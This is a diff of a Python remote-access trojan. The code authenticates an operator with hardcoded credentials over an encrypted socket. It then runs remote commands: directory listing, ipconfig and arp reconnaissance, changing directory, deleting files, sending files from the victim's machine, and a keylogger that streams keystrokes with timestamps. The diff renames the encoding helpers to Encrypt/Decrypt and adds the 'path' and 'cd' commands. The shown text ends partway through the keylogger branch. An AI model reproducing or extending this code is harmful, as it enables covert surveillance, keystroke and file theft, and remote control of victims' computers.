@@ -1,7 +1,6 @@
 import socket
 import subprocess
 import time
-import base64
 import os
 from pynput import keyboard
 from datetime import datetime
@@ -15,25 +14,25 @@ VALID_USERNAME = "amirali"
 VALID_PASSWORD = "aka271827"
 
 def authenticate():
-    connection.send(encode64(b"Username: "))
-    username = decode64(connection.recv(1024)).decode().strip()
-    connection.send(encode64(b"Password: "))
-    password = decode64(connection.recv(1024)).decode().strip()
+    connection.send(Encrypt(b"Username: "))
+    username = Decrypt(connection.recv(1024)).decode().strip()
+    connection.send(Encrypt(b"Password: "))
+    password = Decrypt(connection.recv(1024)).decode().strip()
     if username == VALID_USERNAME and password == VALID_PASSWORD:
-        connection.send(encode64(b"Authentication successful"))
+        connection.send(Encrypt(b"Authentication successful"))
         return True
     else:
-        connection.send(encode64(b"Authentication failed"))
+        connection.send(Encrypt(b"Authentication failed"))
         return False
 def to_1024(data):
     chunk_size = 1024
     chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
     return chunks
 
-def encode64(data):
+def Encrypt(data):
     return cipher.encrypt(data)
 
-def decode64(data):
+def Decrypt(data):
     return cipher.decrypt(data)
 
 def keylogger(keys: int,BUFFER_SIZE):
@@ -45,8 +44,8 @@ def keylogger(keys: int,BUFFER_SIZE):
         if i>=keys:
             if buffer:
                 data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
-                connection.send(encode64(data.encode()))
-            connection.send(encode64(b'Done'))
+                connection.send(Encrypt(data.encode()))
+            connection.send(Encrypt(b'Done'))
             return False      
         try:
             # log_file.write(f"{key.char}")
@@ -66,7 +65,7 @@ def keylogger(keys: int,BUFFER_SIZE):
         i+=1
         if len(buffer)>= BUFFER_SIZE:
             data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
-            connection.send(encode64(data.encode()))
+            connection.send(Encrypt(data.encode()))
             buffer.clear()
 
 
@@ -88,31 +87,39 @@ print(f"Connection from {client_address}")
 
 if authenticate():
     while 1:
-        data = decode64(connection.recv(1024)).decode()
+        data = Decrypt(connection.recv(1024)).decode()
         if data=="close":
             print("Connection closed by server")
             break
         elif data=="dir":
             print(f"Received: {data}")
-            result = encode64(subprocess.run("dir", shell=True, text=True, capture_output=True).stdout.encode())
+            result = Encrypt(subprocess.run("dir", shell=True, text=True, capture_output=True).stdout.encode())
             chunks = to_1024(result)
-            connection.send(encode64(str(len(chunks)).encode()))
+            connection.send(Encrypt(str(len(chunks)).encode()))
+            time.sleep(1)
+            for chunk in chunks:
+                connection.sendall(chunk)
+        elif data=="path":
+            print(f"Received: {data}")
+            path = Encrypt(os.path.abspath(os.getcwd()).encode())
+            chunks = to_1024(path)
+            connection.send(Encrypt(str(len(chunks)).encode()))
             time.sleep(1)
             for chunk in chunks:
                 connection.sendall(chunk)
         elif data=="ipconfig":
             print(f"Received: {data}")
-            result = encode64(subprocess.run("ipconfig", shell=True, text=True, capture_output=True).stdout.encode())
+            result = Encrypt(subprocess.run("ipconfig", shell=True, text=True, capture_output=True).stdout.encode())
             chunks = to_1024(result)
-            connection.send(encode64(str(len(chunks)).encode()))
+            connection.send(Encrypt(str(len(chunks)).encode()))
             time.sleep(1)
             for chunk in chunks:
                 connection.sendall(chunk)
         elif data=="arp -a":
             print(f"Received: {data}")
-            result = encode64(subprocess.run("arp -a", shell=True, text=True, capture_output=True).stdout.encode())
+            result = Encrypt(subprocess.run("arp -a", shell=True, text=True, capture_output=True).stdout.encode())
             chunks = to_1024(result)
-            connection.send(encode64(str(len(chunks)).encode()))
+            connection.send(Encrypt(str(len(chunks)).encode()))
             time.sleep(1)
             for chunk in chunks:
                 connection.sendall(chunk)
@@ -121,9 +128,16 @@ if authenticate():
             path = os.path.abspath(os.getcwd())
             try:
                 os.remove(f"{path}\\{file_name}")
-                connection.send(encode64(b'Done'))
+                connection.send(Encrypt(b'Done'))
             except:
-                connection.send(encode64(b'Wrong file name'))
+                connection.send(Encrypt(b'Wrong file name'))
+        elif "cd" in data:
+            directory = data.split(" ")[1]
+            os.chdir(directory)
+            current_dir = os.path.abspath(os.getcwd())
+            connection.sendall(Encrypt(b'1'))
+            time.sleep(1)
+            connection.sendall(Encrypt(f"Moved to {current_dir}".encode()))
         elif "download" in data:
             file_name = data.split(" ")[1]
             path = os.path.abspath(os.getcwd())
@@ -131,14 +145,14 @@ if authenticate():
                 with open(f"{path}\\{file_name}","rb") as file:
                     content = file.read()
                     file.close()
-                content = encode64(content)
+                content = Encrypt(content)
                 chunks = to_1024(content)
-                connection.send(encode64(str(len(chunks)).encode()))
+                connection.send(Encrypt(str(len(chunks)).encode()))
                 time.sleep(1)
                 for chunk in chunks:
                     connection.sendall(chunk)
             except:
-                connection.send(encode64(b'Wrong file name'))   
+                connection.send(Encrypt(b'Wrong file name'))   
         elif "keylogger" in data:
             keys = int(data.split(" ")[1])
             try:
